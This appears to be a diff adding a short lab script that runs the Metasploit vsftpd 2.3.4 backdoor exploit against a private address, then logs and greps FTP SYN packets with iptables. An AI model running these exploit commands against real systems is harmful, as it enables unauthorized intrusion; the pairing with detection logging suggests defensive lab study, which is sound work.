@@ -1,0 +1,7 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOST 10.0.2.12
+exploit
+
+iptables -I INPUT -p tcp --dport 21 --syn -j LOG --log-prefix "TCP_SYN"
+grep -i "TCP_SYN" syslog
